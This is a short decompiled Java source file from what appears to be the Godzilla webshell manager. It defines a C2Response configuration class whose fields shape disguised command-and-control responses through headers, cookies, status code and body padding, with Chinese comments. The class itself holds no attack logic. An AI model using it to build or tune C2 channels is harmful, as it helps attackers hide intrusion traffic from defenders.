/*    */ package core.c2profile;
/*    */ 
/*    */ import java.util.LinkedHashMap;
/*    */ import org.yaml.snakeyaml.annotation.YamlClass;
/*    */ import org.yaml.snakeyaml.annotation.YamlComment;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ @YamlClass
/*    */ public class C2Response
/*    */ {
/*    */   @YamlComment(Comment = "响应协议头 支持C2信道")
/* 31 */   public LinkedHashMap<String, String> responseHeaders = new LinkedHashMap<>(); @YamlComment(Comment = "响应状态码")
/* 32 */   public int responseCode = 200; @YamlComment(Comment = "响应左边追加数据")
/* 33 */   public byte[] responseLeftBody = "".getBytes(); @YamlComment(Comment = "响应右边追加数据")
/* 34 */   public byte[] responseRightBody = "".getBytes(); @YamlComment(Comment = "响应Cookie 支持C2信道")
/* 35 */   public LinkedHashMap<String, String> responseCookies = new LinkedHashMap<>();
/*    */   @YamlComment(Comment = "请求中间数据 支持C2信道")
/*    */   public String responseMiddleBody;
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\core\c2profile\C2Response.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */